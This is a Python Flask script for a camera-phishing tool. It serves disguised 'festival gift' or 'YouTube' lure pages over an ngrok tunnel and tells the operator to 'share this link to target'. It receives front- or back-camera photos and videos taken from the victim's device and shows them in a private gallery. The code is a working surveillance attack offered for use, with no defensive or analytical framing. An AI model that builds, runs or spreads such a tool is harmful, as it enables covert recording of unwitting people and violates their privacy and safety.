#!/usr/bin/env python3
"""
Gift Video Receiver & Private Gallery Server
Runs Receiver in Current Terminal (Port 5000 + Ngrok) & Spawns Gallery in New Terminal (Port 5001)
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
from datetime import datetime
from pathlib import Path
from functools import wraps
from flask import Flask, request, jsonify, send_file, Response, redirect
from flask_cors import CORS
from werkzeug.utils import secure_filename

# Configuration
UPLOAD_FOLDER = Path("gift_videos")
RECEIVER_PORT = 5000
GALLERY_PORT = 5001
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)

# ============================================
# RECEIVER FLASK APP (PORT 5000)
# ============================================
receiver_app = Flask("receiver")
CORS(receiver_app)
receiver_app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
received_files = []

@receiver_app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@receiver_app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@receiver_app.route('/upload', methods=['POST'])
def upload_media():
    try:
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        default_ext = '.jpg' if media_type == 'photo' else '.webm'
        
        safe_name = secure_filename(media_file.filename)
        if not safe_name or safe_name == 'blob':
            safe_name = f"{media_type}_{timestamp}{default_ext}"
        else:
            name, ext_orig = os.path.splitext(safe_name)
            if not ext_orig:
                ext_orig = default_ext
            safe_name = f"{name}_{timestamp}{ext_orig}"
        
        local_path = UPLOAD_FOLDER / safe_name
        media_file.save(local_path)
        
        file_info = {
            'filename': safe_name,
            'path': str(local_path.absolute()),
            'type': media_type,
            'timestamp': timestamp,
            'size': local_path.stat().st_size
        }
        received_files.append(file_info)
        
        print("\n" + "=" * 60)
        print(f"📹 RECEIVED MEDIA #{len(received_files)} ({media_type.upper()})")
        print("=" * 60)
        print(f"  📁 File:              {safe_name}")
        print(f"  📊 Size:              {file_info['size']:,} bytes")
        print(f"  📂 Local Path:        {file_info['path']}")
        print("=" * 60)
        
        return jsonify({
            'success': True,
            'filename': safe_name,
            'local_path': file_info.get('path')
        }), 200

    except Exception as e:
        print(f"❌ Upload Error: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================
# GALLERY FLASK APP (PORT 5001)
# ============================================
gallery_app = Flask("gallery")
CORS(gallery_app)

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if gallery_app.config.get('AUTH_ENABLED', False):
            auth = request.authorization
            admin_user = gallery_app.config.get('GALLERY_USER')
            admin_pass = gallery_app.config.get('GALLERY_PASS')
            if not auth or auth.username != admin_user or auth.password != admin_pass:
                return Response(
                    '🔒 Access Denied: Gallery authentication required.\n', 401,
                    {'WWW-Authenticate': 'Basic realm="Private Media Gallery"'}
                )
        return f(*args, **kwargs)
    return decorated

@gallery_app.route('/')
def index():
    return redirect('/gallery')

@gallery_app.route('/gallery', methods=['GET'])
@requires_auth
def gallery_page():
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Media Gallery</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; min-height: 100vh; }
        header { max-width: 1200px; margin: 0 auto 30px; display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #1e293b; flex-wrap: wrap; gap: 10px; }
        h1 { font-size: 1.8rem; font-weight: 700; background: linear-gradient(135deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-right { display: flex; align-items: center; gap: 12px; }
        .stats { font-size: 0.9rem; color: #94a3b8; background: #1e293b; padding: 6px 14px; border-radius: 20px; border: 1px solid #334155; }
        .grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .card { background: #1e293b; border-radius: 12px; overflow: hidden; border: 1px solid #334155; transition: transform 0.2s, box-shadow 0.2s; }
        .card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); }
        .media-container { width: 100%; height: 230px; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .media-container video, .media-container img { width: 100%; height: 100%; object-fit: contain; }
        .card-body { padding: 15px; }
        .file-name { font-size: 0.95rem; font-weight: 600; color: #e2e8f0; margin-bottom: 6px; word-break: break-all; }
        .meta { font-size: 0.8rem; color: #94a3b8; display: flex; justify-content: space-between; margin-bottom: 12px; }
        .actions { display: flex; gap: 6px; }
        .btn { flex: 1; text-align: center; padding: 8px 10px; border-radius: 6px; font-size: 0.82rem; font-weight: 500; text-decoration: none; border: none; cursor: pointer; transition: background 0.2s; display: inline-flex; align-items: center; justify-content: center; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-primary:hover { background: #2563eb; }
        .btn-secondary { background: #334155; color: #cbd5e1; }
        .btn-secondary:hover { background: #475569; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-danger:hover { background: #dc2626; }
        .btn-clear-all { background: #991b1b; color: #fca5a5; padding: 6px 14px; border-radius: 20px; font-size: 0.85rem; border: 1px solid #f87171; cursor: pointer; }
        .btn-clear-all:hover { background: #b91c1c; color: white; }
        .empty { text-align: center; grid-column: 1 / -1; padding: 60px; color: #64748b; font-size: 1.1rem; }
    </style>
</head>
<body>
    <header>
        <h1>🖼️ Private Media Gallery</h1>
        <div class="header-right">
            <button class="btn-clear-all" onclick="deleteAllMedia()">🗑️ Delete All</button>
            <div class="stats" id="counter">Auto-Refresh Active (5s)</div>
        </div>
    </header>
    <div class="grid" id="galleryGrid"></div>
    <script>
        async function loadGallery() {
            try {
                const res = await fetch('/files');
                const data = await res.json();
                const files = data.files || [];
                const grid = document.getElementById('galleryGrid');
                document.getElementById('counter').textContent = `${files.length} Item(s) Received`;
                
                if (files.length === 0) {
                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media from Terminal 1 will automatically appear here live!</div>';
                    return;
                }
                
                grid.innerHTML = files.slice().reverse().map(f => {
                    const isVideo = f.type === 'video' || f.filename.endsWith('.webm') || f.filename.endsWith('.mp4');
                    const viewUrl = `/view/${f.filename}`;
                    const downloadUrl = `/download/${f.filename}`;
                    
                    const mediaHtml = isVideo 
                        ? `<video controls src="${viewUrl}" preload="metadata"></video>`
                        : `<img src="${viewUrl}" alt="${f.filename}" loading="lazy">`;
                        
                    return `
                        <div class="card" id="card-${f.filename}">
                            <div class="media-container">${mediaHtml}</div>
                            <div class="card-body">
                                <div class="file-name">${f.filename}</div>
                                <div class="meta">
                                    <span>TYPE: ${f.type.toUpperCase()}</span>
                                    <span>${(f.size / 1024).toFixed(1)} KB</span>
                                </div>
                                <div class="actions">
                                    <a class="btn btn-primary" href="${viewUrl}" target="_blank">🔍 View</a>
                                    <a class="btn btn-secondary" href="${downloadUrl}">📥 Download</a>
                                    <button class="btn btn-danger" onclick="deleteMedia('${f.filename}')">🗑️ Delete</button>
                                </div>
                            </div>
                        </div>
                    `;
                }).join('');
            } catch(e) {
                console.error("Failed loading gallery", e);
            }
        }

        async function deleteMedia(filename) {
            if (!confirm(`Are you sure you want to delete "${filename}"?`)) return;
            try {
                const res = await fetch('/delete/' + encodeURIComponent(filename), { method: 'POST' });
                const data = await res.json();
                if (res.ok && data.success) loadGallery();
                else alert('Error deleting file: ' + (data.error || 'Unknown error'));
            } catch(e) {
                alert('Failed to delete file: ' + e.message);
            }
        }

        async function deleteAllMedia() {
            if (!confirm('⚠️ Are you sure you want to DELETE ALL received images and videos?')) return;
            try {
                const res = await fetch('/delete-all', { method: 'POST' });
                const data = await res.json();
                if (res.ok && data.success) loadGallery();
                else alert('Error clearing media: ' + (data.error || 'Unknown error'));
            } catch(e) {
                alert('Failed to delete all files: ' + e.message);
            }
        }

        loadGallery();
        setInterval(loadGallery, 5000);
    </script>
</body>
</html>"""
    return html_content

@gallery_app.route('/files', methods=['GET'])
@requires_auth
def list_files():
    files = []
    if UPLOAD_FOLDER.exists():
        for filepath in UPLOAD_FOLDER.glob('*'):
            if filepath.is_file() and not filepath.name.startswith('.'):
                ext = filepath.suffix.lower()
                media_type = 'photo' if ext in ['.jpg', '.jpeg', '.png'] else 'video'
                files.append({
                    'filename': filepath.name,
                    'path': str(filepath.absolute()),
                    'type': media_type,
                    'size': filepath.stat().st_size
                })
    return jsonify({'files': files})

@gallery_app.route('/view/<filename>', methods=['GET'])
@requires_auth
def view_media(filename):
    safe_name = secure_filename(filename)
    filepath = UPLOAD_FOLDER / safe_name
    if not filepath.exists():
        return jsonify({'error': 'File not found'}), 404
        
    ext = safe_name.lower().split('.')[-1]
    mime_types = {
        'webm': 'video/webm',
        'mp4': 'video/mp4',
        'jpg': 'image/jpeg',
        'jpeg': 'image/jpeg',
        'png': 'image/png'
    }
    mimetype = mime_types.get(ext, 'application/octet-stream')
    return send_file(filepath, mimetype=mimetype, as_attachment=False)

@gallery_app.route('/download/<filename>', methods=['GET'])
@requires_auth
def download_file(filename):
    safe_name = secure_filename(filename)
    filepath = UPLOAD_FOLDER / safe_name
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

@gallery_app.route('/delete/<filename>', methods=['POST', 'DELETE'])
@requires_auth
def delete_file(filename):
    try:
        safe_name = secure_filename(filename)
        filepath = UPLOAD_FOLDER / safe_name
        if filepath.exists():
            filepath.unlink()
            print(f"🗑️ Deleted file: {safe_name}")
            return jsonify({'success': True}), 200
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@gallery_app.route('/delete-all', methods=['POST', 'DELETE'])
@requires_auth
def delete_all_files():
    try:
        count = 0
        for filepath in UPLOAD_FOLDER.glob('*'):
            if filepath.is_file():
                filepath.unlink()
                count += 1
        print(f"🗑️ Deleted all media ({count} files cleared)")
        return jsonify({'success': True, 'count': count}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================
# RUNNER CLASSES
# ============================================
class ReceiverRunner:
    def __init__(self, port=RECEIVER_PORT):
        self.port = port
        self.ngrok_process = None
        self.ngrok_url = None
        self.running = True
        self.ngrok_ready = threading.Event()

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            return result.returncode == 0
        except FileNotFoundError:
            print("\n❌ ngrok is not installed or not in PATH!")
            print("📥 Install from: https://ngrok.com/download")
            return False

    def apply_ngrok_authtoken(self, token):
        try:
            result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], capture_output=True, text=True)
            if result.returncode == 0:
                print("   ✅ Ngrok authtoken configured successfully!")
                return True
            else:
                result2 = subprocess.run(['ngrok', 'authtoken', token], capture_output=True, text=True)
                return result2.returncode == 0
        except Exception as e:
            print(f"   ⚠️ Could not set ngrok authtoken: {e}")
            return False

    def setup_ngrok_authtoken(self):
        token = os.getenv("NGROK_AUTHTOKEN")
        token_file = Path(".ngrok_token")

        if not token and token_file.exists():
            token = token_file.read_text().strip()

        print("\n🔑 NGROK AUTHENTICATION SETUP:")
        if token:
            masked = f"{token[:6]}...{token[-4:]}" if len(token) > 10 else "***"
            print(f"   Found saved authtoken: {masked}")
            choice = input("   Use saved authtoken? (Y/n, or paste new token): ").strip()
            if choice.lower() in ['', 'y', 'yes']:
                return self.apply_ngrok_authtoken(token)
            elif choice.lower() not in ['n', 'no'] and len(choice) > 10:
                token = choice
            elif choice.lower() in ['n', 'no']:
                token = ""

        if not token:
            token = input("   Enter your ngrok Authtoken (press Enter to skip): ").strip()

        if token:
            token_file.write_text(token)
            return self.apply_ngrok_authtoken(token)
        return True

    def monitor_ngrok(self):
        try:
            time.sleep(2)
            for attempt in range(15):
                if self.ngrok_process and self.ngrok_process.poll() is not None:
                    _, err = self.ngrok_process.communicate()
                    err_msg = err.strip() if err else "Process exited unexpectedly."
                    print(f"\n❌ ngrok process stopped working! Error details:\n   {err_msg}")
                    self.ngrok_ready.set()
                    return

                for api_url in ['http://127.0.0.1:4040/api/tunnels', 'http://localhost:4040/api/tunnels']:
                    try:
                        with urllib.request.urlopen(api_url, timeout=2) as response:
                            data = json.loads(response.read().decode())
                            for tunnel in data.get('tunnels', []):
                                if tunnel.get('proto') == 'https':
                                    self.ngrok_url = tunnel.get('public_url')
                                    self.ngrok_ready.set()
                                    return
                    except Exception:
                        pass
                time.sleep(2)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30) and self.ngrok_url:
                print(f"✅ Tunnel established!")
                return True
            else:
                if self.ngrok_process and self.ngrok_process.poll() is None:
                    print("⚠️ ngrok started but URL not found on http://127.0.0.1:4040")
                return False
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting receiver server on port {self.port}...")
        def run_flask():
            receiver_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Receiver server running")

    def show_menu(self):
        print("\n" + "=" * 60)
        print("📹 RECEIVER & MEDIA CAPTURE SERVER (TERMINAL 1)")
        print("=" * 60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice in ['1', '2']:
                return 'festival' if choice == '1' else 'youtube'
            print("❌ Invalid choice. Enter 1 or 2")

    def get_camera_type(self):
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice in ['1', '2']:
                return 'user' if choice == '1' else 'environment'
            print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        print("\n📸 Select capture mode:")
        print("  1. Video - Record video")
        print("  2. Photo - Capture photos")
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                dur_input = input("   ⏱️ Enter video duration in seconds (default 15): ").strip()
                duration = int(dur_input) if dur_input.isdigit() and int(dur_input) > 0 else 15
                return 'video', duration, 0
            elif choice == '2':
                photo_input = input("   📸 Enter number of photos to capture (default 5): ").strip()
                photos = int(photo_input) if photo_input.isdigit() and int(photo_input) > 0 else 5
                return 'photo', 0, photos
            print("❌ Invalid choice. Enter 1 or 2")

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        return link, mode_name

    def run(self):
        try:
            if not self.check_ngrok():
                return
            self.setup_ngrok_authtoken()
            mode = self.show_menu()
            camera = self.get_camera_type()
            capture_mode, duration, photos = self.get_capture_mode()
            
            if mode == 'festival':
                name = input("\n📝 Enter festival name (default: Surprise): ").strip() or "Surprise"
                video_id = None
            else:
                print("\n🎬 Enter YouTube video URL or ID (press Enter for default):")
                video_input = input("   ▶ ").strip()
                video_id = "dQw4w9WgXcQ"
                if video_input:
                    patterns = [
                        r'(?:youtube\.com\/watch\?v=)([^&]+)',
                        r'(?:youtu\.be\/)([^?]+)',
                        r'(?:youtube\.com\/embed\/)([^?]+)'
                    ]
                    for pattern in patterns:
                        match = re.search(pattern, video_input)
                        if match:
                            video_id = match.group(1)
                            break
                    else:
                        video_id = video_input
                name = None

            self.start_flask()
            if not self.start_ngrok():
                return

            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)

            print("\n" + "=" * 60)
            print(f"📤 SHARE THIS LINK TO TARGET ({mode_name}):")
            print("=" * 60)
            print(f"\n🔗 {link}\n")
            print("=" * 60)
            print(f"\n🎁 Receiver is ready and listening on port {self.port}!")
            print(f"📁 Local Upload Folder: {UPLOAD_FOLDER.absolute()}")
            print(f"🖼️ Gallery is running in Terminal 2 at: http://localhost:{GALLERY_PORT}/gallery")
            print("=" * 60)

            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n👋 Receiver server shutting down...")
        finally:
            if self.ngrok_process:
                self.ngrok_process.terminate()


class GalleryRunner:
    def __init__(self, port=GALLERY_PORT):
        self.port = port
        self.running = True

    def get_credentials(self):
        print("\n" + "=" * 60)
        print("🖼️ PRIVATE MEDIA GALLERY SERVER (TERMINAL 2)")
        print("=" * 60)
        print("\n🔐 GALLERY LOGIN SETUP:")
        user = input("   👤 Enter Gallery Username (default: admin): ").strip() or "admin"
        password = input("   🔑 Enter Gallery Password (default: admin123): ").strip() or "admin123"
        
        gallery_app.config['GALLERY_USER'] = user
        gallery_app.config['GALLERY_PASS'] = password
        gallery_app.config['AUTH_ENABLED'] = True
        return user, password

    def start_flask(self):
        print(f"\n🔧 Starting Gallery Server on port {self.port}...")
        def run_flask():
            gallery_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Gallery Server running!")

    def run(self):
        try:
            user, password = self.get_credentials()
            self.start_flask()

            local_url = f"http://localhost:{self.port}/gallery"
            
            print("\n" + "=" * 60)
            print("🖼️ PRIVATE GALLERY IS READY:")
            print("=" * 60)
            print(f"  🏠 Local Gallery Link: {local_url}")
            print(f"  🔐 Login Credentials: Username: {user} | Password: {password}")
            print(f"  📁 Reading From:       {UPLOAD_FOLDER.absolute()}")
            print("=" * 60)

            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n👋 Gallery server shutting down...")

def spawn_gallery_terminal():
    server_script = Path(__file__).absolute()
    print("\n🖥️ Opening Private Gallery Server in a NEW terminal window...")

    if sys.platform == "win32":
        try:
            subprocess.Popen(f'start "Private Gallery Server" cmd /k "{sys.executable} "{server_script}" --gallery"', shell=True)
            print("   ✅ Opened Gallery Server in a new Windows terminal window!")
            return True
        except Exception as e:
            print(f"   ⚠️ Could not open new window automatically: {e}")
            return False
    else:
        # Linux / macOS (Parrot OS, Debian, Ubuntu, etc.)
        cmd_str = f'{sys.executable} "{server_script}" --gallery'
        terminals = [
            ['x-terminal-emulator', '-e', cmd_str],
            ['qterminal', '-e', cmd_str],
            ['gnome-terminal', '--', sys.executable, str(server_script), '--gallery'],
            ['konsole', '-e', sys.executable, str(server_script), '--gallery'],
            ['xfce4-terminal', '-e', cmd_str],
            ['xterm', '-e', cmd_str]
        ]
        
        for term_cmd in terminals:
            try:
                if subprocess.run(['which', term_cmd[0]], capture_output=True).returncode == 0:
                    subprocess.Popen(term_cmd)
                    print(f"   ✅ Opened Gallery Server in a new terminal window ({term_cmd[0]})!")
                    return True
            except Exception:
                pass
        
        print(f"   ⚠️ Could not auto-detect terminal emulator. You can run 'python3 server.py --gallery' in another terminal.")
        return False

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--gallery':
        # Run Gallery Server mode (Terminal 2)
        gallery = GalleryRunner()
        gallery.run()
    else:
        # Main entry point (Terminal 1): Spawn Gallery in new terminal, run Receiver in current terminal
        spawn_gallery_terminal()
        receiver = ReceiverRunner()
        receiver.run()